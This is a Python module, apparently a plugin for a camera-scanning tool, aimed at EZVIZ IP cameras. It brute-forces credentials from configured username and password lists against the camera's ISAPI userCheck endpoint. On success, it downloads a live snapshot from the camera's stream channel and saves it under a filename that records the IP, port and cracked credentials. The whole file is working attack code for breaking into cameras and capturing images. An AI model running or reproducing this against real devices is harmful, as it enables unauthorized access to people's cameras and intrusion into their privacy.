"""EZVIZ camera weak password check."""
import requests
from loguru import logger
from .base import POCTemplate


class EZVIZWeakPassword(POCTemplate):
    def __init__(self, config):
        super().__init__(config)
        self.name = self.get_file_name(__file__)
        self.product = config.product.get("ezviz", "ezviz")
        self.level = POCTemplate.level.medium
        self.desc = "EZVIZ camera weak/default password"

    def verify(self, ip, port=80):
        headers = {"User-Agent": self.config.user_agent}
        for user in self.config.users:
            for password in self.config.passwords:
                url = f"http://{ip}:{port}/ISAPI/Security/userCheck"
                try:
                    r = self.session.get(url, headers=headers, auth=(user, password),
                                         timeout=self.config.timeout, verify=False)
                    if (r.status_code == 200
                            and "userCheck" in r.text and "200" in r.text):
                        return ip, str(port), self.product, user, password, self.name
                except Exception as e:
                    logger.error(e)
        return None

    def exploit(self, results):
        ip, port, product, user, password, vul = results
        return self._snapshot(
            f"http://{ip}:{port}/ISAPI/Streaming/channels/101/picture",
            f"{ip}-{port}-{user}-{password}-ezviz.jpg",
            auth=(user, password))


POCTemplate.register_poc(EZVIZWeakPassword)
